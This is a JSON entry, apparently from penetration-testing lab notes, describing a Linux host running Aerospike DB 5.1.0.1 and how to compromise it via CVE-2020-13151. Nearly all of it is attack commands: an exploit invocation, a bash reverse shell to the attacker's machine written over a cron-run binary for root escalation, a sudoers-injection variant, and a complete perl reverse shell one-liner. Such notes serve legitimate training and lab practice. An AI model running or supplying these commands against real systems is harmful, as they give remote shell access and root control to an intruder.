    {
      "id":"aero",
      "label":"Aero",
      "ip":"192.168.x.143",
      "os":"Linux",
      "role":"Standalone",
      "networks":["external"],
      "services":[
        {
          "port":3003,"name":"Aerospike DB","version":"5.1.0.1",
          "vulnerabilities":[
            {"type":"rce","cve":"CVE-2020-13151","summary":"Aerospike DB RCE","leads_to":"local-user"}
          ],
          "commands":[
            "searchsploit aerospike",
            "python3 exploit.py -t 192.168.x.143 -lh 192.168.x.KALI -lp 443"
          ]
        }
      ],
      "privesc":[
        {
          "from":"aero",
          "to":"root",
          "technique":"Cron job binary overwrite — root runs /opt/aerospike/bin/asadm every minute, owned by aero",
          "commands":[
            "pspy64",
            "echo '#!/bin/bash\\nbash -i >& /dev/tcp/192.168.x.KALI/9001 0>&1' > /opt/aerospike/bin/asadm",
            "chmod +x /opt/aerospike/bin/asadm"
          ]
        }
      ],
      "credentials":[],
      "alternatives":[
        {"source":"A3","description":"Write sudoers entry into asadm instead of reverse shell","commands":["echo '#!/bin/bash\\necho \"aero ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers' > /opt/aerospike/bin/asadm"]},
        {"source":"A3","description":"Use perl reverse shell if bash/busybox shells hang","commands":["perl -e 'use Socket;$i=\"192.168.x.KALI\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"]}
      ]
    },
